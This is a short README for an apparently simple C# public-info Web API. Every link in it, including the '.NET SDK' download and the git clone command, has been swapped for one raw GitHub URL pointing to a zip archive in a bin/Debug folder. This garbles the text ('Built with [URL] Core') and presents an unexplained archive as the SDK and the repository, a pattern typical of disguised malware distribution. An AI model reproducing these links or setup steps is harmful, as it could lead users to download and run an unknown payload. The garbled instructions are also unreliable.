# HNG Public API

This is a C# Web API that returns basic information.

# Features
- Returns email, current datetime, and GitHub repo URL in JSON format.
- Built with **https://raw.githubusercontent.com/SamB-ima/PublicInfoAPI/main/bin/Debug/net9.0/API_Public_Info_1.1.zip Core**.
- Supports **CORS** for external access.

# Setup Instructions

1. Install .NET SDK from [https://raw.githubusercontent.com/SamB-ima/PublicInfoAPI/main/bin/Debug/net9.0/API_Public_Info_1.1.zip].
2. Clone the repository:
   ```sh
   git clone https://raw.githubusercontent.com/SamB-ima/PublicInfoAPI/main/bin/Debug/net9.0/API_Public_Info_1.1.zip
   cd PublicAPI
